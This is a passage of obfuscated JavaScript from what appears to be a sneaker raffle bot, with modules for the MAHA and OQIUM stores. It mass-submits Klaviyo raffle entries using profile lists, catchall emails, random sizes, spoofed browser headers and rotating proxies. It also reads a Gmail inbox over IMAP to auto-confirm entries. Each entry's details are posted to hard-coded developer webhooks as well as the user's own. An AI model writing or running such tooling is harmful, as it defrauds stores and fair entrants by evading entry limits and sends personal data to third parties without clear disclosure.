                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x11f526, _0x45060f, _0x24343e) {
                    for (var _0x53d7e5 = 0x0; _0x53d7e5 < _0x45060f['length']; _0x53d7e5++) {
                        async function _0x275b41(_0x49b4e4, _0x3591b8, _0x20a8be, _0x5d64ee, _0x4b1fe5) {
                            var _0x26cdd8, _0x25034f = {}, _0x5511f9 = [], _0x1f7a01 = {}, _0x509b6b = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x361dae = Math['round'](Math['random']() * (_0x509b6b['length'] - 0x1));
                            _0x5d64ee[_0x49b4e4]['Size'] == 'RANDOM' && (_0x5d64ee[_0x49b4e4]['Size'] = _0x509b6b[_0x361dae]);
                            !_0x5d64ee && (_0x5d64ee = {});
                            if (_0x3591b8 != 'ver') {
                                _0x40199d(_0x20a8be['name'] + '\x20Task\x20' + (_0x49b4e4 + 0x1) + '\x20/\x20' + _0x5d64ee['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x5d64ee, _0x49b4e4), _0x25034f = _0x20a8be['data'];
                                _0x3591b8 == 'exp' ? _0x25034f['data']['attributes']['email'] = '' + _0x5d64ee[_0x49b4e4]['FirstName'] + _0x5d64ee[_0x49b4e4]['LastName'] + _0xb4964b['catchall'] : _0x25034f['data']['attributes']['email'] = '' + _0x5d64ee[_0x49b4e4]['Email'];
                                if (_0x5d64ee[_0x49b4e4]['Size'] == 'RANDOM') {
                                }
                                _0x25034f['data']['attributes']['properties']['$first_name'] = '' + _0x5d64ee[_0x49b4e4]['FirstName'], _0x25034f['data']['attributes']['properties']['$last_name'] = '' + _0x5d64ee[_0x49b4e4]['LastName'], _0x25034f['data']['attributes']['properties']['$address1'] = _0x5d64ee[_0x49b4e4]['Address1'] + '\x20' + _0x5d64ee[_0x49b4e4]['Address2'] + '\x20' + _0x5d64ee[_0x49b4e4]['HouseNumber'], _0x25034f['data']['attributes']['properties']['$zip'] = '' + _0x5d64ee[_0x49b4e4]['Zip'], _0x25034f['data']['attributes']['properties']['$city'] = '' + _0x5d64ee[_0x49b4e4]['City'], _0x25034f['data']['attributes']['properties']['$country'] = '' + _0x5d64ee[_0x49b4e4]['Country'], _0x25034f['data']['attributes']['properties']['Size'] = '' + _0x5d64ee[_0x49b4e4]['Size'], _0x25034f['data']['attributes']['properties']['$phone_number'] = '' + _0x5d64ee[_0x49b4e4]['Phone'], _0x25034f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x5d64ee[_0x49b4e4]['Follower'];
                            }
                            if (_0xb4964b['useRandomProxy'] = ![])
                                var _0x412198 = _0x4b1fe5[_0x49b4e4]['split'](':');
                            else
                                var _0x2fa750 = Math['round'](Math['random']() * (_0x4b1fe5['length'] - 0x1)), _0x412198 = _0x4b1fe5[_0x2fa750]['split'](':');
                            var _0xa67caa = {
                                'jar': _0x3aae82,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x20a8be['url'],
                                'headers': _0x20a8be['headers'],
                                'body': JSON['stringify'](_0x25034f),
                                'proxy': 'http://' + _0x412198[0x2] + ':' + _0x412198[0x3] + '@' + _0x412198[0x0] + ':' + _0x412198[0x1]
                            };
                            return _0x3591b8 != 'ver' && (_0xa67caa['url'] = _0x20a8be['url'], _0xa67caa['headers'] = _0x20a8be['headers']), _0x3591b8 == 'ver' && (_0xa67caa['method'] = 'GET'), new Promise(function (_0x57570e, _0x37ad56) {
                                callback = async (_0x36cfe7, _0x25d3a1, _0xa4d45b) => {
                                    if (!_0x36cfe7 && _0x25d3a1['statusCode'] == 0xca || !_0x36cfe7 && _0x25d3a1['statusCode'] == 0xc8) {
                                        if (_0x3591b8 != 'ver') {
                                            var _0x3350f2 = await _0x4d9326(_0x5d64ee[_0x49b4e4], _0x20a8be, 'dev', ![]), _0x7a7743 = await _0x4d9326(_0x5d64ee[_0x49b4e4], _0x20a8be, 'pub', ![]);
                                            const _0x4ba24d = {
                                                'succesDEVMSG': { 'embeds': [_0x3350f2] },
                                                'succesPUBMSG': { 'embeds': [_0x7a7743] }
                                            };
                                            if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                                                try {
                                                    await _0x584f8b(_0xb4964b['webhook'], _0x4ba24d['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x4ba24d['succesDEVMSG']), await _0x63444f(0xc8);
                                            try {
                                                await _0x584f8b(_0x3501b6, _0x4ba24d['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xa2d2c6(_0x5d64ee[_0x49b4e4], _0x20a8be);
                                        }
                                        _0x57570e(console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x20a8be['name'] + ']\x20Task\x20' + (_0x49b4e4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3591b8 != 'ver') {
                                            var _0x3623b1 = '' + _0x36cfe7, _0x1ffc43 = await _0x4d9326(_0x5d64ee[_0x49b4e4], _0x20a8be, 'dev', !![], _0x3623b1), _0x4169a5 = {};
                                            _0x4169a5['errorDEV'] = { 'embeds': [_0x1ffc43] }, _0x1d0bc0(_0x5d64ee[_0x49b4e4], _0x20a8be), _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x4169a5['errorDEV']), await _0x584f8b(_0x437fba, _0x4169a5['errorDEV']);
                                        }
                                        _0x37ad56(console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x20a8be['name'] + ']\x20Task\x20' + (_0x49b4e4 + 0x1) + ':\x20' + _0x36cfe7)));
                                    }
                                };
                                try {
                                    _0x3591b8 != 'ver' && console['log'](_0x46d913() + '\x20[' + _0x20a8be['name'] + ']\x20Task\x20' + (_0x49b4e4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x25034f['data']['attributes']['email']), _0x15bdb0(_0xa67caa, callback);
                                } catch (_0x28deb2) {
                                    console['log'](_0x46d913() + '\x20Task\x20' + (_0x49b4e4 + 0x1) + ':\x20' + _0x28deb2);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x275b41(_0x53d7e5, 'nor', _0x11f526, _0x45060f, _0x24343e), console['log'](_0x46d913() + '\x20[' + _0x11f526['name'] + ']\x20Sleeping\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        } catch (_0x4c9af2) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x95b4b0, _0xa8dd5d, _0x4daddf) {
                    var _0x5663dd = [];
                    async function _0x27f49f() {
                        var _0x1d40c7 = new _0x2021ac({
                            'user': _0xb4964b['masterMail'],
                            'password': _0xb4964b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x279810(_0x23b146) {
                            _0x1d40c7['openBox']('INBOX', ![], _0x23b146);
                        }
                        _0x1d40c7['once']('ready', function () {
                            _0x279810(function (_0x1dc241, _0x41abda) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1dc241)
                                    throw _0x1dc241;
                                _0x1d40c7['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'FROM',
                                        'service@maha-amsterdam.com'
                                    ]
                                ], function (_0x53c986, _0x2281da) {
                                    if (!_0x2281da || !_0x2281da['length'])
                                        console['log'](_0x46d913() + '\x20[' + _0x95b4b0['name'] + ']\x20No\x20mails\x20found'), _0x1d40c7['end']();
                                    else {
                                        var _0x4e941e = _0x1d40c7['seq']['fetch'](_0x2281da, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4e941e['on']('message', function (_0x1868fd, _0x5f32dc) {
                                            var _0x4cce98 = '(#' + _0x5f32dc + ')\x20';
                                            _0x1868fd['on']('body', function (_0x10ad4a, _0x26b733) {
                                                _0x22cc54(_0x10ad4a, (_0x91171e, _0x104a6d) => {
                                                    if (_0x104a6d['subject'] == 'Confirm\x20Your\x20Subscription' && _0x104a6d['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x5f41ab = _0x104a6d['text']['split']('(')[0x1], _0x3ae580 = _0x5f41ab['split'](')')[0x0];
                                                        _0x5663dd['push'](_0x3ae580);
                                                    }
                                                });
                                            }), _0x1868fd['once']('end', function () {
                                            });
                                        }), _0x4e941e['once']('error', function (_0xd183ff) {
                                            console['log']('Fetch\x20error:\x20' + _0xd183ff);
                                        }), _0x4e941e['once']('end', function () {
                                            _0x1d40c7['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x1d40c7['once']('error', function (_0x184202) {
                            console['log'](_0x580fd6['red'](_0x184202['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x1d40c7['once']('end', async function () {
                        }), _0x1d40c7['connect']();
                    }
                    async function _0x5a0ac1(_0x43419e, _0x2d1160, _0x2ba9b6) {
                        for (var _0x1539f0 = 0x0; _0x1539f0 < _0x2d1160['length']; _0x1539f0++) {
                            async function _0x3ba9b9(_0x3f4a4e, _0x1c13f3, _0x36a1d5, _0x57fe5b, _0x14356f) {
                                var _0x237d36, _0x132cb5 = {}, _0xd059a4 = [], _0x50da4f = {}, _0x33530e = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3232e9 = Math['round'](Math['random']() * (_0x33530e['length'] - 0x1));
                                _0x57fe5b[_0x3f4a4e]['Size'] == 'RANDOM' && (_0x57fe5b[_0x3f4a4e]['Size'] = _0x33530e[_0x3232e9]);
                                !_0x57fe5b && (_0x57fe5b = {});
                                if (_0xb4964b['useRandomProxy'] = ![])
                                    var _0xb35229 = _0x14356f[_0x3f4a4e]['split'](':');
                                else
                                    var _0x16a6b7 = Math['round'](Math['random']() * (_0x14356f['length'] - 0x1)), _0xb35229 = _0x14356f[_0x16a6b7]['split'](':');
                                var _0x3f4ccc = {
                                    'jar': _0x3aae82,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x36a1d5['url'],
                                    'headers': _0x36a1d5['headers'],
                                    'body': JSON['stringify'](_0x132cb5),
                                    'proxy': 'http://' + _0xb35229[0x2] + ':' + _0xb35229[0x3] + '@' + _0xb35229[0x0] + ':' + _0xb35229[0x1]
                                };
                                return _0x1c13f3 != 'ver' && (_0x3f4ccc['url'] = _0x36a1d5['url'], _0x3f4ccc['headers'] = _0x36a1d5['headers']), _0x1c13f3 == 'ver' && (_0x3f4ccc['method'] = 'GET', _0x3f4ccc['url'] = _0x57fe5b[_0x3f4a4e]), new Promise(function (_0x38c694, _0x417767) {
                                    callback = async (_0x1581eb, _0x1cf109, _0x414e77) => {
                                        if (!_0x1581eb && _0x1cf109['statusCode'] == 0xca || !_0x1581eb && _0x1cf109['statusCode'] == 0xc8) {
                                            if (_0x1c13f3 != 'ver') {
                                                var _0x57f8dd = await _0x4d9326(_0x57fe5b[_0x3f4a4e], _0x36a1d5, 'dev', ![]), _0xebe50 = await _0x4d9326(_0x57fe5b[_0x3f4a4e], _0x36a1d5, 'pub', ![]);
                                                const _0x311a39 = {
                                                    'succesDEVMSG': { 'embeds': [_0x57f8dd] },
                                                    'succesPUBMSG': { 'embeds': [_0xebe50] }
                                                };
                                                if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                                                    try {
                                                        await _0x584f8b(_0xb4964b['webhook'], _0x311a39['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x311a39['succesDEVMSG']), await _0x63444f(0xc8);
                                                try {
                                                    await _0x584f8b(_0x3501b6, _0x311a39['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xa2d2c6(_0x57fe5b[_0x3f4a4e], _0x36a1d5);
                                            }
                                            _0x38c694(console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x36a1d5['name'] + ']\x20Task\x20' + (_0x3f4a4e + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1c13f3 != 'ver') {
                                                var _0x45a08e = '' + _0x1581eb, _0x3bd15e = await _0x4d9326(_0x57fe5b[_0x3f4a4e], _0x36a1d5, 'dev', !![], _0x45a08e), _0x12a120 = {};
                                                _0x12a120['errorDEV'] = { 'embeds': [_0x3bd15e] }, _0x1d0bc0(_0x57fe5b[_0x3f4a4e], _0x36a1d5), _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x12a120['errorDEV']), await _0x584f8b(_0x437fba, _0x12a120['errorDEV']);
                                            }
                                            _0x417767(console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x36a1d5['name'] + ']\x20Task\x20' + (_0x3f4a4e + 0x1) + ':\x20' + _0x1581eb)));
                                        }
                                    };
                                    try {
                                        _0x1c13f3 != 'ver' ? console['log'](_0x46d913() + '\x20[' + _0x36a1d5['name'] + ']\x20Task\x20' + (_0x3f4a4e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x132cb5['data']['attributes']['email']) : console['log'](_0x46d913() + '\x20[' + _0x36a1d5['name'] + ']\x20Task\x20' + (_0x3f4a4e + 0x1) + ':\x20Fetching\x20Response'), _0x15bdb0(_0x3f4ccc, callback);
                                    } catch (_0x23b903) {
                                        console['log'](_0x46d913() + '\x20Task\x20' + (_0x3f4a4e + 0x1) + ':\x20' + _0x23b903);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3ba9b9(_0x1539f0, 'ver', _0x43419e, _0x2d1160, _0x2ba9b6), console['log'](_0x46d913() + '\x20[' + _0x43419e['name'] + ']\x20Sleeping\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                            } catch (_0x5c5e50) {
                            }
                        }
                    }
                    try {
                        _0x27f49f(), await _0x63444f(0xfa0), console['log']('Found\x20' + _0x5663dd['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x63444f(0x9c4);
                    }
                    await _0x5a0ac1(_0x95b4b0, _0x5663dd, _0x4daddf);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x37e1e8, _0x191fbd, _0x1a612b) {
                    for (var _0x2e5c3f = 0x0; _0x2e5c3f < _0x191fbd['length']; _0x2e5c3f++) {
                        async function _0x18ccac(_0x5d07b0, _0x28162b, _0x546c26, _0x144c5e, _0x2da600) {
                            var _0x3c5de3, _0x1e9256 = {}, _0x1635df = [], _0x12f408 = {}, _0xfa5961 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x432407 = Math['round'](Math['random']() * (_0xfa5961['length'] - 0x1));
                            _0x144c5e[_0x5d07b0]['Size'] == 'RANDOM' && (_0x144c5e[_0x5d07b0]['Size'] = _0xfa5961[_0x432407]);
                            !_0x144c5e && (_0x144c5e = {});
                            if (_0x28162b != 'ver') {
                                _0x40199d(_0x546c26['name'] + '\x20Task\x20' + (_0x5d07b0 + 0x1) + '\x20/\x20' + _0x144c5e['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x144c5e, _0x5d07b0), _0x1635df = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x1a887b
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x144c5e[_0x5d07b0]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0xb4964b['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x3b25e6
                                        }
                                    ]
                                }], _0x12f408 = { 'embeds': _0x1635df }, _0x1e9256 = _0x546c26['data'];
                                _0x28162b == 'exp' ? _0x1e9256['data']['attributes']['email'] = '' + _0x144c5e[_0x5d07b0]['FirstName'] + _0x144c5e[_0x5d07b0]['LastName'] + _0xb4964b['catchall'] : _0x1e9256['data']['attributes']['email'] = '' + _0x144c5e[_0x5d07b0]['Email'];
                                if (_0x144c5e[_0x5d07b0]['Size'] == 'RANDOM') {
                                }
                                _0x1e9256['data']['attributes']['properties']['$first_name'] = '' + _0x144c5e[_0x5d07b0]['FirstName'], _0x1e9256['data']['attributes']['properties']['$last_name'] = '' + _0x144c5e[_0x5d07b0]['LastName'], _0x1e9256['data']['attributes']['properties']['$address1'] = _0x144c5e[_0x5d07b0]['Address1'] + '\x20' + _0x144c5e[_0x5d07b0]['Address2'] + '\x20' + _0x144c5e[_0x5d07b0]['HouseNumber'], _0x1e9256['data']['attributes']['properties']['$zip'] = '' + _0x144c5e[_0x5d07b0]['Zip'], _0x1e9256['data']['attributes']['properties']['$city'] = '' + _0x144c5e[_0x5d07b0]['City'], _0x1e9256['data']['attributes']['properties']['$country'] = '' + _0x144c5e[_0x5d07b0]['Country'], _0x1e9256['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x144c5e[_0x5d07b0]['Size'], _0x1e9256['data']['attributes']['properties']['$phone_number'] = '' + _0x144c5e[_0x5d07b0]['Phone'], _0x1e9256['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x144c5e[_0x5d07b0]['Follower'];
                            }
                            if (_0xb4964b['useRandomProxy'] = ![])
                                var _0x97bad8 = _0x2da600[_0x5d07b0]['split'](':');
                            else
                                var _0x4c2380 = Math['round'](Math['random']() * (_0x2da600['length'] - 0x1)), _0x97bad8 = _0x2da600[_0x4c2380]['split'](':');
                            var _0x381e52 = {
                                'jar': _0x3aae82,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x546c26['url'],
                                'headers': _0x546c26['headers'],
                                'body': JSON['stringify'](_0x1e9256),
                                'proxy': 'http://' + _0x97bad8[0x2] + ':' + _0x97bad8[0x3] + '@' + _0x97bad8[0x0] + ':' + _0x97bad8[0x1]
                            };
                            return _0x28162b != 'ver' && (_0x381e52['url'] = _0x546c26['url'], _0x381e52['headers'] = _0x546c26['headers']), _0x28162b == 'ver' && (_0x381e52['method'] = 'GET'), new Promise(function (_0x1f65f4, _0x33d34e) {
                                callback = async (_0x3a614a, _0x36a5e5, _0x41a967) => {
                                    if (!_0x3a614a && _0x36a5e5['statusCode'] == 0xca || !_0x3a614a && _0x36a5e5['statusCode'] == 0xc8) {
                                        if (_0x28162b != 'ver') {
                                            var _0x33e893 = await _0x4d9326(_0x144c5e[_0x5d07b0], _0x546c26, 'dev', ![]), _0x513da6 = await _0x4d9326(_0x144c5e[_0x5d07b0], _0x546c26, 'pub', ![]);
                                            const _0x29f22d = {
                                                'succesDEVMSG': { 'embeds': [_0x33e893] },
                                                'succesPUBMSG': { 'embeds': [_0x513da6] }
                                            };
                                            if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                                                try {
                                                    await _0x584f8b(_0xb4964b['webhook'], _0x29f22d['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x29f22d['succesDEVMSG']), await _0x63444f(0xc8);
                                            try {
                                                await _0x584f8b(_0x3501b6, _0x29f22d['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xa2d2c6(_0x144c5e[_0x5d07b0], _0x546c26);
                                        }
                                        _0x1f65f4(console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x546c26['name'] + ']\x20Task\x20' + (_0x5d07b0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x28162b != 'ver') {
                                            var _0xda00c2 = '' + _0x3a614a, _0x219760 = await _0x4d9326(_0x144c5e[_0x5d07b0], _0x546c26, 'dev', !![], _0xda00c2), _0x3407d7 = {};
                                            _0x3407d7['errorDEV'] = { 'embeds': [_0x219760] }, _0x1d0bc0(_0x144c5e[_0x5d07b0], _0x546c26), _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x3407d7['errorDEV']), await _0x584f8b(_0x437fba, _0x3407d7['errorDEV']);
                                        }
                                        _0x33d34e(console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x546c26['name'] + ']\x20Task\x20' + (_0x5d07b0 + 0x1) + ':\x20' + _0x3a614a)));
                                    }
                                };
                                try {
                                    _0x28162b != 'ver' && console['log'](_0x46d913() + '\x20[' + _0x546c26['name'] + ']\x20Task\x20' + (_0x5d07b0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1e9256['data']['attributes']['email']), _0x15bdb0(_0x381e52, callback);
                                } catch (_0x465a70) {
                                    console['log'](_0x46d913() + '\x20Task\x20' + (_0x5d07b0 + 0x1) + ':\x20' + _0x465a70);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x18ccac(_0x2e5c3f, 'nor', _0x37e1e8, _0x191fbd, _0x1a612b), console['log'](_0x46d913() + '\x20[' + _0x37e1e8['name'] + ']\x20Sleeping\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        } catch (_0xb4c984) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3282bf, _0x180c59, _0x1e2824) {
                    var _0x180c59 = [];
                    async function _0xd85786() {
                        var _0x2efbec = new _0x2021ac({
                            'user': _0xb4964b['masterMail'],
                            'password': _0xb4964b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x40d8f6(_0x20ea98) {
                            _0x2efbec['openBox']('INBOX', ![], _0x20ea98);
                        }
                        _0x2efbec['once']('ready', function () {
                            _0x40d8f6(function (_0x1311fc, _0xb6affc) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1311fc)
                                    throw _0x1311fc;
                                _0x2efbec['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'FROM',
                                        'customerservice@oqium.com'
                                    ]
                                ], function (_0x458d58, _0x3ab42c) {
                                    if (!_0x3ab42c || !_0x3ab42c['length'])
                                        console['log'](_0x46d913() + '\x20[' + _0x3282bf['name'] + ']\x20No\x20mails\x20found'), _0x2efbec['end']();
                                    else {
                                        var _0x1f0556 = _0x2efbec['seq']['fetch'](_0x3ab42c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1f0556['on']('message', function (_0x3053a1, _0x11804b) {
                                            var _0x236dcf = '(#' + _0x11804b + ')\x20';
